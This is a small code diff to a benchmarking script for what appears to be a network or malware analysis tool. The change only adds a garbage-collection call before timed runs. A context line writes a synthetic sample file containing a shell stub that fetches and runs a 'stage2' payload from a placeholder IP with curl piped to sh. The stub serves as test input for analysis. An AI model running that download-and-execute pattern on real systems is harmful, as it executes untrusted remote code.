@@ -8,6 +8,7 @@ Measures the analysis and report hot spots in a throwaway YEMU_HOME.
 
 import argparse
 import asyncio
+import gc
 import logging
 import os
 import random
@@ -231,6 +232,7 @@ def main():
             shutil.copytree(args.rules, paths.synced_rules_dir(), dirs_exist_ok=True)
         BenchBackend.PCAP_PATH = os.path.join(HOME, "bench.pcap")
         write_pcap(BenchBackend.PCAP_PATH)
+        gc.collect()  # the generated packets are cyclic garbage; don't bill their collection to the first run
         sample = os.path.join(HOME, "sample.bin")
         with open(sample, "wb") as f:
             f.write(b"#!/bin/sh\ncurl http://203.0.113.10/stage2 | sh\n" + random.Random(0).randbytes(1 << 20))
